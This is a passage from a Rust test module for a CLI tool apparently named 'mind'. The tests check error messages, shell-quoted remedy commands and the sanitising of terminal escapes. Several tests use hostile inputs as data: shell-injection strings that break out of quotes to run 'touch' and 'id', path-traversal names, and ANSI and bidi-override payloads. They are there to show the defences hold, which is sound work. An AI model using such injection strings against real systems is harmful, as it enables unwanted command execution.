            .arg(format!("printf '%s' {quoted}"))
            .output()
            .expect("sh -c must run");
        assert_eq!(
            String::from_utf8_lossy(&output.stdout),
            evil,
            "the shell must see the identity back exactly as given, proving the \
             embedded `$(...)` was passed through literally rather than executed"
        );
    }

    /// The prose mentions of `pattern` and `source_name` (outside the
    /// backticked command) stay bare, matching pinned text 3: only the
    /// command occurrence needs quoting, and quoting the prose too would make
    /// the message harder to read for the common (non-hostile) case.
    #[test]
    fn learn_no_match_message_leaves_prose_mentions_bare() {
        // spec: CLI-236
        let msg = learn_no_match_message("review", "my-source");
        assert!(
            msg.contains("--learn pattern 'review' matches no item in source 'my-source'"),
            "{msg}"
        );
        assert!(
            msg.contains("run `mind probe --source 'my-source' --no-tui` to list what it offers"),
            "{msg}"
        );
    }

    /// L4(a): the `--add-root` caveat is part of the pinned message text --
    /// the flag only takes effect at the meld that first registers a source,
    /// so after a `--learn` miss (which happens on an already-registered
    /// source) it is silently ignored unless the caller unmelds first.
    #[test]
    fn learn_no_match_message_states_the_add_root_ordering_caveat() {
        // spec: CLI-236
        let msg = learn_no_match_message("review", "my-source");
        assert!(
            msg.contains(
                "needs `--add-root <dir>` at the meld that registers the source \
                 (`unmeld` first if it is already melded)"
            ),
            "{msg}"
        );
    }

    /// M1/CLI-236: the message points at `mind probe --source <name> --no-tui`
    /// (which lists what a source OFFERS), never `mind recall` (which lists
    /// what is INSTALLED and, after a no-match, would report an empty listing
    /// that contradicts the message's own claim).
    #[test]
    fn learn_no_match_message_never_suggests_recall() {
        // spec: CLI-236
        let msg = learn_no_match_message("review", "my-source");
        assert!(!msg.contains("mind recall"), "{msg}");
        assert!(msg.contains("mind probe --source"), "{msg}");
    }

    // HARN-1/HARN-4: the new lobe-related errors render actionable messages
    // (the kind/preset list and the add-needs-a-target hint).
    #[test]
    fn lobe_errors_render_actionable_messages() {
        // spec: HARN-1
        // spec: HARN-4
        let unknown_kind = MindError::UnknownKind {
            kind: "wizard".into(),
        }
        .to_string();
        assert!(unknown_kind.contains("wizard"), "{unknown_kind}");
        assert!(
            unknown_kind.contains("skill") && unknown_kind.contains("tool"),
            "UnknownKind must list the valid kinds: {unknown_kind}"
        );

        let unknown_preset = MindError::UnknownPreset {
            name: "emacs".into(),
        }
        .to_string();
        assert!(unknown_preset.contains("emacs"), "{unknown_preset}");
        // spec: HARN-4 -- the real presets (gemini, codex, universal, windsurf).
        assert!(
            unknown_preset.contains("gemini")
                && unknown_preset.contains("codex")
                && unknown_preset.contains("universal")
                && unknown_preset.contains("windsurf"),
            "UnknownPreset must list the valid presets: {unknown_preset}"
        );
        assert!(
            !unknown_preset.contains("antigravity"),
            "UnknownPreset must not mention removed presets: {unknown_preset}"
        );

        let needs_target = MindError::LobeTargetRequired.to_string();
        assert!(
            needs_target.contains("path") && needs_target.contains("--preset"),
            "LobeTargetRequired must mention both a path and --preset: {needs_target}"
        );
    }

    // HARN-1: parse_kinds rejects the first unknown string with UnknownKind and
    // accepts a well-formed list in order.
    #[test]
    fn parse_kinds_accepts_known_rejects_unknown() {
        // spec: HARN-1
        let ok = ItemKind::parse_kinds(&["skill".into(), "agent".into(), "rule".into()]).unwrap();
        assert_eq!(ok, vec![ItemKind::Skill, ItemKind::Agent, ItemKind::Rule]);

        let err = ItemKind::parse_kinds(&["skill".into(), "wizard".into()]).unwrap_err();
        assert!(
            matches!(err, MindError::UnknownKind { ref kind } if kind == "wizard"),
            "the first unknown kind must surface as UnknownKind: {err:?}"
        );
    }

    #[test]
    fn namespace_locked_displays_items_and_forget_hint() {
        // spec: NS-30 CLI-161 - the lock error names the source, lists every
        // installed item, and directs the user to `mind forget` before changing
        // the namespace.
        let e = MindError::NamespaceLocked {
            src_name: "github.com/acme/agents".into(),
            items: vec!["skill:review".into(), "agent:dev".into()],
        }
        .to_string();
        assert!(e.contains("github.com/acme/agents"), "{e}");
        assert!(
            e.contains("skill:review") && e.contains("agent:dev"),
            "must list every installed item: {e}"
        );
        assert!(e.contains("forget"), "must direct the user to forget: {e}");
        assert!(e.contains("namespace"), "must mention the namespace: {e}");
    }

    #[test]
    fn hook_failed_displays_identity_and_command() {
        // spec: HOOK-30
        let e = MindError::HookFailed {
            identity: "github.com/acme/tools".into(),
            command: "make install".into(),
            status: None,
            stderr: "boom".into(),
            streamed: false,
        };
        let msg = e.to_string();
        assert!(msg.contains("github.com/acme/tools"), "msg: {msg}");
        assert!(msg.contains("make install"), "msg: {msg}");
        assert!(msg.contains("boom"), "msg: {msg}");
    }

    // spec: HOOK-30
    // A silent hook failure (no stdout/stderr) must render "(no output)" so the
    // error message does not point at framed output blocks that were never printed.
    #[test]
    fn hook_failed_silent_exit_renders_no_output() {
        let e = MindError::HookFailed {
            identity: "github.com/acme/tools".into(),
            command: "exit 1".into(),
            status: None,
            stderr: String::new(),
            streamed: false,
        };
        let msg = e.to_string();
        assert!(
            msg.contains("(no output)"),
            "silent failure must say '(no output)', not 'see the hook's output above': {msg}"
        );
        assert!(
            !msg.contains("see the hook"),
            "must not point to framed output when nothing was printed: {msg}"
        );
    }

    // spec: HOOK-30
    // A hook failure with stderr content must include that content in the message,
    // not the "(no output)" fallback.
    #[test]
    fn hook_failed_with_stderr_renders_stderr_not_no_output() {
        let e = MindError::HookFailed {
            identity: "github.com/acme/tools".into(),
            command: "make install".into(),
            status: None,
            stderr: "some diagnostic".into(),
            streamed: false,
        };
        let msg = e.to_string();
        assert!(
            msg.contains("some diagnostic"),
            "stderr content must appear in the message: {msg}"
        );
        assert!(
            !msg.contains("(no output)"),
            "must not say '(no output)' when stderr was captured: {msg}"
        );
    }

    // spec: HOOK-30
    // When a hook produced output that was already streamed to the terminal
    // (`streamed` true), HookFailed must say "its output, if any, is in the frame above" rather
    // than the misleading "(no output)" -- even when stderr is empty, because
    // the diagnostics were already visible on screen.
    #[test]
    fn hook_failed_with_streamed_points_at_the_frame_not_no_output() {
        let e = MindError::HookFailed {
            identity: "github.com/acme/tools".into(),
            command: "make install".into(),
            status: None,
            stderr: String::new(),
            streamed: true,
        };
        let msg = e.to_string();
        assert!(
            msg.contains("its output, if any, is in the frame above"),
            "streamed=true must point at the frame: {msg}"
        );
        assert!(
            !msg.contains("(no output)"),
            "must not say '(no output)' when output was already shown: {msg}"
        );
        // Identity and command must still appear.
        assert!(
            msg.contains("github.com/acme/tools"),
            "missing identity: {msg}"
        );
        assert!(msg.contains("make install"), "missing command: {msg}");
    }

    // NS-43 / NS-45: SkillCollision lists all conflicting items, names the
    // existing source for each, and suggests --namespace with the repo name.
    #[test]
    fn skill_collision_renders_conflict_list_and_namespace_hint() {
        // spec: NS-43 NS-45
        let e = MindError::SkillCollision {
            conflicts: vec![
                (
                    "skill".into(),
                    "review".into(),
                    "github.com/acme/agents".into(),
                ),
                (
                    "rule".into(),
                    "style".into(),
                    "github.com/acme/rules".into(),
                ),
            ],
            suggested: "acme".into(),
        };
        let msg = e.to_string();
        assert!(
            msg.contains("name collision"),
            "must contain 'name collision': {msg}"
        );
        assert!(
            msg.contains("skill:review"),
            "must list skill:review: {msg}"
        );
        assert!(msg.contains("rule:style"), "must list rule:style: {msg}");
        assert!(
            msg.contains("github.com/acme/agents"),
            "must name the existing source: {msg}"
        );
        assert!(
            msg.contains("--namespace 'acme'"),
            "must suggest --namespace with the shell-quoted repo name (CLI-225): {msg}"
        );
    }

    // L18: `DuplicateItem` and `InvalidRoot` carry source-controlled fields
    // (`source_name`, `root`, `name`) that `main.rs` prints verbatim via
    // `eprintln!("error: {err}")`, so a hostile repo's own rejection must not
    // carry attacker escape bytes to the terminal.
    #[test]
    fn duplicate_item_and_invalid_root_sanitize_source_controlled_fields() {
        // spec: DSC-95
        let evil = "\x1b[31mevil\u{202E}".to_string();

        let dup = MindError::DuplicateItem {
            source_name: evil.clone(),
            kind: ItemKind::Skill,
            name: evil.clone(),
        }
        .to_string();
        assert!(!dup.contains('\x1b'), "must strip raw ESC: {dup:?}");
        assert!(!dup.contains('\u{202E}'), "must strip raw bidi: {dup:?}");
        assert!(dup.contains("evil"), "must still name the value: {dup}");

        let root = MindError::InvalidRoot {
            source_name: evil.clone(),
            root: evil,
        }
        .to_string();
        assert!(!root.contains('\x1b'), "must strip raw ESC: {root:?}");
        assert!(!root.contains('\u{202E}'), "must strip raw bidi: {root:?}");
        assert!(root.contains("evil"), "must still name the value: {root}");
    }

    // spec: HOOK-30
    // streamed=true takes priority over a non-empty stderr field (the field
    // is empty in production but this guards the priority rule explicitly).
    #[test]
    fn hook_failed_streamed_priority_over_stderr_content() {
        let e = MindError::HookFailed {
            identity: "github.com/acme/tools".into(),
            command: "make install".into(),
            status: None,
            stderr: "some content".into(),
            streamed: true,
        };
        let msg = e.to_string();
        assert!(
            msg.contains("its output, if any, is in the frame above"),
            "streamed=true must take priority: {msg}"
        );
        assert!(
            !msg.contains("(no output)"),
            "must not say '(no output)': {msg}"
        );
    }

    #[test]
    fn item_not_found_no_sources_hints_meld() {
        // When no sources are melded, the error must direct the user to `mind meld`
        // rather than `mind sync` (which would be useless with no sources).
        let e = MindError::ItemNotFound {
            query: "review".into(),
            sources: 0,
        }
        .to_string();
        assert!(e.contains("review"), "must include query: {e}");
        assert!(
            e.contains("meld"),
            "no-sources hint must mention `meld`: {e}"
        );
        assert!(
            !e.contains("sync"),
            "no-sources path must not suggest `sync`: {e}"
        );
    }

    // spec: CLI-179
    #[test]
    fn item_not_found_with_sources_hints_probe_not_sync() {
        // With sources present the hint directs the user to probe; sync is not
        // mentioned because syncing cannot surface an item that does not exist.
        let e = MindError::ItemNotFound {
            query: "review".into(),
            sources: 3,
        }
        .to_string();
        assert!(e.contains("review"), "must include query: {e}");
        assert!(e.contains("3"), "must include source count: {e}");
        assert!(e.contains("probe"), "must mention `probe`: {e}");
        // sync must not appear -- it cannot help a name that will never exist.
        assert!(
            !e.contains("sync"),
            "with sources must not mention `sync`: {e}"
        );
        // Must not suggest running `mind meld` (only appropriate when sources == 0).
        // The word "melded" may appear in the count phrase "across N melded source(s)".
        assert!(
            !e.contains("mind meld") && !e.contains("meld <"),
            "with sources must not suggest `meld`: {e}"
        );
    }

    // L17 (partial): a plain ASCII query gets no non-printing-character hint --
    // the hint only fires when it would actually explain something.
    #[test]
    fn item_not_found_plain_query_has_no_non_printing_hint() {
        // spec: DSC-95
        let e = MindError::ItemNotFound {
            query: "review".into(),
            sources: 1,
        }
        .to_string();
        assert!(
            !e.contains("non-printing"),
            "a plain query must not carry the non-printing-character hint: {e}"
        );
    }

    // L17 (partial): DSC-95 sanitizes an installed name's *display* (e.g. in
    // `recall`) while keeping the raw name as identity, so `mind recall` can
    // show what looks like `skill:review` while `mind forget skill:review`
    // (the sanitized text, typed back) fails with "not installed" -- an
    // unfalsifiable-looking contradiction unless the message explains why. A
    // ref carrying a character DSC-95 would strip gets a hint naming that
    // possibility.
    #[test]
    fn item_not_found_and_not_installed_hint_non_printing_characters() {
        // spec: DSC-95
        let evil = "review\u{200B}".to_string(); // zero-width space: invisible

        let not_found = MindError::ItemNotFound {
            query: evil.clone(),
            sources: 2,
        }
        .to_string();
        assert!(
            not_found.contains("non-printing"),
            "ItemNotFound must hint at a non-printing character: {not_found}"
        );

        let not_installed = MindError::NotInstalled { name: evil }.to_string();
        assert!(
            not_installed.contains("not installed"),
            "must still say 'not installed': {not_installed}"
        );
        assert!(
            not_installed.contains("non-printing"),
            "NotInstalled must hint at a non-printing character: {not_installed}"
        );
    }

    // U37: SourceNotFound must name the next command, mirroring ItemNotFound's
    // house style (CLI-179), so a typo'd source name points somewhere useful.
    #[test]
    fn source_not_found_hints_recall_sources() {
        let e = MindError::SourceNotFound {
            name: "jaemk/minds".into(),
        }
        .to_string();
        assert!(e.contains("jaemk/minds"), "must include the name: {e}");
        assert!(
            e.contains("mind recall --sources"),
            "must hint the exact next command: {e}"
        );
    }

    // L9: `SourceNotFound` is reachable both from an exact-name source lookup
    // and from a glob selector (`mind sync 'acme/*'`) that matched nothing.
    // The old wording ("no source named '{name}' is melded") asserts
    // something is literally *named* the given string -- false for a
    // selector, and it invites the reader to conclude glob selectors are
    // unsupported. The new wording must not claim anything is "named" the
    // selector.
    #[test]
    fn source_not_found_selector_wording_does_not_claim_a_name() {
        let e = MindError::SourceNotFound {
            name: "acme/*".into(),
        }
        .to_string();
        assert!(e.contains("acme/*"), "must include the selector: {e}");
        assert!(
            !e.contains("no source named"),
            "must not claim a selector is a literal name: {e}"
        );
        assert!(
            e.contains("no melded source matches"),
            "must phrase this as 'matches', covering both an exact name and a \
             selector without lying about either: {e}"
        );
    }

    // U37: UnknownLobe must likewise name the next command.
    #[test]
    fn unknown_lobe_hints_config_lobes_list() {
        let e = MindError::UnknownLobe {
            path: "/no/such/lobe".into(),
        }
        .to_string();
        assert!(e.contains("/no/such/lobe"), "must include the path: {e}");
        assert!(
            e.contains("mind config lobes list"),
            "must hint the exact next command: {e}"
        );
    }

    #[test]
    fn link_occupied_includes_force_hint() {
        // spec: LIFE-41 -- the `--force` remedy must be surfaced in the error.
        let e = MindError::LinkOccupied {
            path: "/home/user/.claude/skills/foo".into(),
        }
        .to_string();
        assert!(
            e.contains("--force"),
            "LinkOccupied must mention --force: {e}"
        );
        assert!(
            e.contains("/home/user/.claude/skills/foo"),
            "must include the path: {e}"
        );
    }

    #[test]
    fn digest_mismatch_includes_url_and_digests() {
        // spec: STO-47
        let e = MindError::DigestMismatch {
            url: "https://example.com/mind-0.1.0.tar.gz".into(),
            expected: "abc123".into(),
            actual: "def456".into(),
        }
        .to_string();
        assert!(e.contains("abc123"), "must include expected digest: {e}");
        assert!(e.contains("def456"), "must include actual digest: {e}");
        assert!(
            e.contains("https://example.com/mind-0.1.0.tar.gz"),
            "must include URL: {e}"
        );
    }

    #[test]
    fn attestation_verification_failed_names_reason_and_kind() {
        // spec: STO-66
        let e = MindError::AttestationVerificationFailed {
            reason: "no attestations found".into(),
        };
        let msg = e.to_string();
        assert!(
            msg.contains("no attestations found"),
            "must include the reason: {msg}"
        );
        assert!(
            msg.contains("aborting"),
            "must say evolve is aborting: {msg}"
        );
        assert_eq!(e.kind(), "attestation-verification-failed");
    }

    #[test]
    fn state_too_new_names_file_and_versions() {
        // spec: STO-51
        let e = MindError::StateTooNew {
            what: "sources.json",
            found: 3,
            supported: 1,
        }
        .to_string();
        assert!(e.contains("sources.json"), "must name the file: {e}");
        assert!(e.contains("3"), "must name the found version: {e}");
        assert!(e.contains("1"), "must name the supported version: {e}");
        // The remedy points at the actual self-update verb (`mind evolve`);
        // `mind upgrade` upgrades installed items, not the binary.
        assert!(e.contains("mind evolve"), "must suggest `mind evolve`: {e}");
        // L11: `mind evolve` alone strands a user whose state was written by a
        // locally built binary newer than the latest release (`evolve` would
        // just report "up to date"), so a second remedy names the real fix.
        assert!(
            e.contains("newer") && e.contains("that wrote it"),
            "must also suggest using the newer mind that wrote the state: {e}"
        );
    }

    // The self-update verb is `evolve`, not `upgrade` (which upgrades installed
    // items); the remedy must name the actual verb.
    #[test]
    fn incompatible_version_remedy_points_at_evolve() {
        // spec: DSC-40
        let e = MindError::IncompatibleVersion {
            source_name: "github.com/acme/agents".into(),
            required: "0.30.0".into(),
            running: "0.22.0".into(),
        }
        .to_string();
        assert!(e.contains("github.com/acme/agents"), "{e}");
        assert!(e.contains("0.30.0") && e.contains("0.22.0"), "{e}");
        assert!(
            e.contains("mind evolve"),
            "must suggest `mind evolve`, not `mind upgrade`: {e}"
        );
        assert!(
            !e.contains("upgrade mind"),
            "must not say 'upgrade mind' (upgrade upgrades items, not the binary): {e}"
        );
    }

    // spec: LIFE-46 CLI-225 -- the rename-collision refusal names both
    // colliding occupants and both real remedies, rather than reusing
    // `AmbiguousItem`'s "query"/"matches" phrasing (which implies a search the
    // user never performed) with no remedy at all. The forget remedy also
    // shell-quotes `key` (CLI-225); see
    // `upgrade_rename_collision_remedy_shell_quotes_the_forget_argument` below
    // for the full injection-inertness proof.
    #[test]
    fn upgrade_rename_collision_names_both_occupants_and_both_remedies() {
        let e = MindError::UpgradeRenameCollision {
            key: "skill:review".into(),
            existing_source: "github.com/acme/x".into(),
            incoming: "skill:jx:review".into(),
            incoming_source: "github.com/acme/y".into(),
        };
        let msg = e.to_string();
        assert!(
            msg.contains("skill:review"),
            "must name the target key: {msg}"
        );
        assert!(
            msg.contains("github.com/acme/x"),
            "must name the existing occupant's source: {msg}"
        );
        assert!(
            msg.contains("skill:jx:review"),
            "must name the incoming item: {msg}"
        );
        assert!(
            msg.contains("github.com/acme/y"),
            "must name the incoming item's source: {msg}"
        );
        assert!(
            msg.contains(&format!("mind forget {}", shell_quote("skill:review"))),
            "must give the forget remedy, shell-quoted per CLI-225: {msg}"
        );
        assert!(
            msg.contains("mind meld -N"),
            "must give the re-namespace remedy: {msg}"
        );
        // Must not be phrased as a user-typed query/match list (AmbiguousItem's
        // house style), since no query was ever typed here.
        assert!(
            !msg.contains("is ambiguous; matches:"),
            "must not reuse AmbiguousItem's query/matches phrasing: {msg}"
        );
        assert_eq!(e.kind(), "upgrade-rename-collision");
    }

    // M14: `UnsafeName`'s Display strips ANSI/control/bidi characters for
    // display (the pattern `unsafe_prefix_error_mentions_prefix` below pins
    // for `UnsafePrefix`) while still naming the value, and the cause list
    // covers a NUL byte and an empty name, not just path traversal --
    // `install.rs`'s raise site fires on all three, so a name that failed for
    // carrying a NUL must not be paired with a cause that plainly does not
    // apply to it.
    #[test]
    fn unsafe_name_error_strips_escape_and_bidi_characters_but_still_names_the_value() {
        // spec: NS-28
        let e = MindError::UnsafeName {
            name: "..\u{202E}\x1b[31m".into(),
        }
        .to_string();
        assert!(
            !e.contains('\x1b'),
            "must not carry the raw ESC byte: {e:?}"
        );
        assert!(
            !e.contains('\u{202E}'),
            "must not carry the raw bidi-override code point: {e:?}"
        );
        // The path-traversal prefix (the printable part of the payload) still
        // appears, so the value is nameable rather than fully swallowed.
        assert!(e.contains(".."), "must still name the value: {e}");
        // The cause list must cover NUL and empty, not just path traversal
        // (install.rs's raise site fires on all three).
        assert!(
            e.contains("NUL") && e.contains("empty"),
            "cause list must mention NUL and empty: {e}"
        );
        // Since stripping changed the displayed value, the message must say so.
        assert!(
            e.contains("stripped"),
            "must note the name was stripped for display: {e}"
        );
    }

    #[test]
    fn unsafe_prefix_error_mentions_prefix() {
        // spec: NS-28
        let e = MindError::UnsafePrefix {
            prefix: "../evil".into(),
        }
        .to_string();
        assert!(e.contains("../evil"), "must include the prefix: {e}");
    }

    // M13: a melded repo's `[source].prefix` reaches `UnsafePrefix`, so a
    // rejected prefix carrying a bidi-spoofing/ANSI payload must not be
    // interpolated raw into the rejection message itself -- otherwise the
    // rejection meant to stop the spoofing attempt becomes the delivery
    // mechanism for it. The cause list must also mention invisible/bidi/
    // zero-width characters generically (not a fixed enumeration), since the
    // blocked set lives in `sanitize.rs` and can grow.
    #[test]
    fn unsafe_prefix_error_strips_bidi_and_ansi_payload_from_the_prefix() {
        // spec: NS-28
        let e = MindError::UnsafePrefix {
            prefix: "\u{202E}\x1b[31mevil".into(),
        }
        .to_string();
        assert!(
            !e.contains('\x1b'),
            "must not carry the raw ESC byte: {e:?}"
        );
        assert!(
            !e.contains('\u{202E}'),
            "must not carry the raw bidi-override code point: {e:?}"
        );
        assert!(e.contains("evil"), "must still name the value: {e}");
        assert!(
            e.contains("invisible") || e.contains("bidi") || e.contains("zero-width"),
            "cause list must mention invisible/bidi/zero-width characters: {e}"
        );
    }

    // spec: CLI-182
    // kind() returns stable, non-empty kebab-case slugs. Spot-check a
    // representative sample; the exhaustive match in the impl guarantees every
    // variant has a slug.
    #[test]
    fn kind_slugs_are_stable() {
        assert_eq!(
            MindError::ItemNotFound {
                query: "x".into(),
                sources: 0
            }
            .kind(),
            "item-not-found"
        );
        assert_eq!(
            MindError::DigestMismatch {
                url: "u".into(),
                expected: "e".into(),
                actual: "a".into()
            }
            .kind(),
            "digest-mismatch"
        );
        assert_eq!(
            MindError::SelfUpdatePolicy { detail: "d".into() }.kind(),
            "self-update-policy"
        );
        assert_eq!(MindError::HomeDirNotFound.kind(), "home-dir-not-found");
        assert_eq!(MindError::GitNotFound.kind(), "git-not-found");
        assert_eq!(MindError::ReleaseAssetEmpty.kind(), "release-asset-empty");
        assert_eq!(MindError::LobeTargetRequired.kind(), "lobe-target-required");
        // spec: HOOK-103 CLI-195 -- the two `hooks run` error variants carry
        // stable slugs.
        assert_eq!(
            MindError::BuildEventRequiresItemTarget.kind(),
            "build-event-requires-item-target"
        );
        assert_eq!(
            MindError::HookAborted { label: "h".into() }.kind(),
            "hook-aborted"
        );
        // spec: LNK-14 -- the malformed-item-link error carries a stable slug.
        assert_eq!(
            MindError::BadItemLink {
                url: "u".into(),
                reason: "r".into()
            }
            .kind(),
            "bad-item-link"
        );
        // spec: CLI-212 CLI-213 -- a gone linked source's clone carries its own
        // stable slug, distinct from the generic scan failures.
        assert_eq!(
            MindError::LinkedSourceGone {
                source_name: "s".into(),
                path: "p".into(),
            }
            .kind(),
            "linked-source-gone"
        );
        // spec: HOOK-107 -- "ran nothing because consent was unavailable"
        // carries its own stable slug, distinct from HookAborted.
        assert_eq!(
            MindError::HooksNotRun {
                target: "t".into(),
                event: "install".into(),
                skipped: 1,
                resolved: vec!["t".into()],
            }
            .kind(),
            "hooks-not-run"
        );

        // Every slug must be non-empty and kebab-case (lowercase, hyphens only).
        let samples: &[(&str, &MindError)] = &[
            (
                "item-not-found",
                &MindError::ItemNotFound {
                    query: "x".into(),
                    sources: 0,
                },
            ),
            ("home-dir-not-found", &MindError::HomeDirNotFound),
            ("git-not-found", &MindError::GitNotFound),
        ];
        for (expected, err) in samples {
            let slug = err.kind();
            assert_eq!(slug, *expected, "slug mismatch for variant");
            assert!(
                !slug.is_empty(),
                "slug must be non-empty for variant {expected}"
            );
            assert!(
                slug.chars().all(|c| c.is_ascii_lowercase() || c == '-'),
                "slug must be lowercase kebab-case: {slug}"
            );
        }
    }

    // spec: CLI-212 CLI-213
    #[test]
    fn linked_source_gone_names_source_and_remedy() {
        // The message must name the source, the vanished path, and the exact
        // `unmeld` remedy so it is directly actionable.
        let e = MindError::LinkedSourceGone {
            source_name: "local/tmp/starter".into(),
            path: "/tmp/starter".into(),
        };
        let msg = e.to_string();
        assert!(
            msg.contains("local/tmp/starter"),
            "must name the source: {msg}"
        );
        assert!(msg.contains("/tmp/starter"), "must name the path: {msg}");
        assert!(
            msg.contains("mind unmeld 'local/tmp/starter'"),
            "must give the copy-pasteable, shell-quoted unmeld remedy (CLI-225): {msg}"
        );
    }

    // spec: HOOK-107 HOOK-106
    #[test]
    fn hooks_not_run_names_target_count_and_remedy() {
        let e = MindError::HooksNotRun {
            target: "myrepo".into(),
            event: "install".into(),
            skipped: 2,
            resolved: vec!["myrepo".into()],
        };
        let msg = e.to_string();
        assert!(msg.contains("myrepo"), "must name the target: {msg}");
        assert!(msg.contains('2'), "must name the skipped count: {msg}");
        // spec: HOOK-106 -- every resolved identity is shell-quoted (single
        // quotes) before it lands in the printed command, even one with no
        // metacharacters, since quoting is applied unconditionally rather than
        // only when something "looks dangerous" (`shell_quote`).
        assert!(
            msg.contains(
                "mind hooks run 'myrepo' --event install --dangerously-skip-install-hook-check"
            ),
            "must give the copy-pasteable, shell-quoted remedy: {msg}"
        );
    }

    /// HOOK-106: the remedy re-selects the event the run selected. Without the
    /// `--event` segment the printed command re-runs the source's INSTALL
    /// hooks, which is different code than the uninstall hooks that were
    /// skipped -- a silent substitution for anyone who copy-pastes it.
    // spec: HOOK-106
    #[test]
    fn hooks_not_run_remedy_carries_the_selected_event() {
        let e = MindError::HooksNotRun {
            target: "myrepo".into(),
            event: "uninstall".into(),
            skipped: 1,
            resolved: vec!["myrepo".into()],
        };
        let msg = e.to_string();
        assert!(
            msg.contains(
                "mind hooks run 'myrepo' --event uninstall --dangerously-skip-install-hook-check"
            ),
            "the remedy must re-select the uninstall event: {msg}"
        );
        assert!(
            !msg.contains("--event install"),
            "the remedy must not name a different event than the run selected: {msg}"
        );
    }

    /// When several sources/items resolved and contributed a skipped hook (a
    /// glob selector), the message must not synthesize a single "re-run with
    /// 'mind hooks run <target> ...'" command from the raw (possibly glob)
    /// selector: that string, pasted into a shell, could glob-expand against
    /// the caller's cwd instead of naming a real source. Instead every
    /// resolved identity is listed so the reader substitutes one at a time.
    // spec: HOOK-106 HOOK-107
    #[test]
    fn hooks_not_run_several_resolved_targets_lists_names_not_one_fake_command() {
        let e = MindError::HooksNotRun {
            target: "*".into(),
            event: "install".into(),
            skipped: 3,
            resolved: vec!["github.com/a/one".into(), "github.com/a/two".into()],
        };
        let msg = e.to_string();
        assert!(msg.contains('3'), "must name the skipped count: {msg}");
        assert!(
            msg.contains("github.com/a/one") && msg.contains("github.com/a/two"),
            "must list every resolved identity: {msg}"
        );
        assert!(
            !msg.contains("mind hooks run * --event"),
            "must never echo the raw glob selector back into a runnable-looking \
             remedy command: {msg}"
        );
        assert!(
            !msg.contains(
                "mind hooks run github.com/a/one --event install \
             --dangerously-skip-install-hook-check"
            ) && !msg.contains(
                "mind hooks run github.com/a/two --event install \
                     --dangerously-skip-install-hook-check"
            ),
            "must not synthesize a single command for either resolved name either \
             (both had work, so neither alone is the whole remedy): {msg}"
        );
    }

    // spec: CLI-215
    #[test]
    fn invalid_repo_spec_names_local_path_forms() {
        // mind review --help documents local-path forms as an accepted target;
        // the error naming the accepted spec shapes must not omit them.
        let e = MindError::InvalidRepoSpec {
            spec: "bogus".into(),
        };
        let msg = e.to_string();
        assert!(msg.contains("./rel/path"), "must mention './': {msg}");
        assert!(msg.contains("../rel/path"), "must mention '../': {msg}");
        assert!(
            msg.contains("/abs/path"),
            "must mention an absolute path: {msg}"
        );
        assert!(msg.contains("file://"), "must mention 'file://': {msg}");
    }

    // spec: STO-56
    #[test]
    fn lobe_base_missing_displays_path() {
        // LobeBaseMissing must name the missing path in its message and carry the
        // correct kind slug ("lobe-base-missing").
        let path = std::path::PathBuf::from("/nonexistent/myproject");
        let e = MindError::LobeBaseMissing { path: path.clone() };
        let msg = e.to_string();
        assert!(
            msg.contains("/nonexistent/myproject"),
            "must include the path: {msg}"
        );
        assert!(
            msg.contains("does not exist"),
            "must say directory does not exist: {msg}"
        );
        assert_eq!(e.kind(), "lobe-base-missing", "kind slug must be stable");
    }

    // spec: STO-69
    #[test]
    fn unsafe_clone_path_names_path_and_identity() {
        // The message must name both the offending resolved path and the
        // source identity it belongs to, and carry the stable
        // "unsafe-clone-path" kind slug.
        let e = MindError::UnsafeClonePath {
            path: PathBuf::from("/home/user/evil"),
            identity: "../../victim".into(),
        };
        let msg = e.to_string();
        assert!(
            msg.contains("/home/user/evil"),
            "must include the offending path: {msg}"
        );
        assert!(
            msg.contains("../../victim"),
            "must include the source identity: {msg}"
        );
        assert!(
            msg.contains("sources tree"),
            "must say it resolves outside the sources tree: {msg}"
        );
        assert_eq!(e.kind(), "unsafe-clone-path", "kind slug must be stable");
    }

    // spec: HOOK-105 HOOK-106
    #[test]
    fn ambiguous_hook_target_names_both_disambiguated_forms() {
        // The message must name the ambiguous target string once as the source
        // form (prefixed with `source:`) and once as a kind-qualified item ref,
        // so a reader can copy either escape directly.
        let e = MindError::AmbiguousHookTarget {
            target: "local/base/repo#dev".into(),
            item_forms: vec!["local/base/repo#skill:dev".into()],
        };
        let msg = e.to_string();
        assert!(
            msg.contains("local/base/repo#dev"),
            "must name the ambiguous target: {msg}"
        );
        assert!(
            msg.contains("source:local/base/repo#dev"),
            "must name the source-targeting escape: {msg}"
        );
        assert!(
            msg.contains("local/base/repo#skill:dev"),
            "must name the kind-qualified item escape: {msg}"
        );
        assert_eq!(
            e.kind(),
            "ambiguous-hook-target",
            "kind slug must be stable"
        );
    }

    /// HOOK-105/HOOK-106 (P0 injection, the fix this shard exists for):
    /// `AmbiguousHookTarget`'s two runnable-command examples must shell-quote
    /// `target` and the item form, exactly as `HooksNotRun`'s remedy does.
    /// Before this fix both were interpolated bare inside a hand-written
    /// `'source:{target}'` / `'{}'` frame; an identity carrying an embedded
    /// single quote breaks out of that bare frame, and `;`/`$(...)`/backtick
    /// ride along unquoted once it has. Proved two ways: the printed message
    /// must carry the properly `shell_quote`d form (not the broken bare
    /// interpolation), and running each disambiguating command through a real
    /// shell must leave the identity intact as one literal argument with the
    /// injected `touch` never firing.
    // spec: HOOK-105 HOOK-106
    #[test]
    fn ambiguous_hook_target_shell_quotes_both_runnable_examples() {
        use std::process::Command;

        let target = "x'; touch /tmp/mind-hook-105-pwned; echo '`id`$(id)".to_string();
        let item_form =
            "local/base/x'; touch /tmp/mind-hook-105-item-pwned; echo '#skill:x".to_string();
        let e = MindError::AmbiguousHookTarget {
            target: target.clone(),
            item_forms: vec![item_form.clone()],
        };
        let msg = e.to_string();

        // The source-targeting example must carry the shell-quoted
        // `source:<target>` argument, not a bare interpolation.
        let quoted_source = shell_quote(&format!("source:{target}"));
        assert!(
            msg.contains(&format!("mind hooks run {quoted_source}")),
            "the source-targeting example must be shell-quoted: {msg}"
        );
        assert!(
            !msg.contains(&format!("mind hooks run 'source:{target}'")),
            "must never fall back to the broken bare `'source:{{target}}'` \
             interpolation: {msg}"
        );

        // The item-targeting example must carry the shell-quoted item form.
        let quoted_item = shell_quote(&item_form);
        assert!(
            msg.contains(&format!("mind hooks run {quoted_item}")),
            "the item-targeting example must be shell-quoted: {msg}"
        );
        assert!(
            !msg.contains(&format!("mind hooks run '{item_form}'")),
            "must never fall back to the broken bare `'{{item_form}}'` \
             interpolation: {msg}"
        );

        // Execution proof, mirroring `shell_quote_round_trips_a_malicious_identity_through_a_real_shell`:
        // extract each `mind hooks run <arg>` example and run it through a
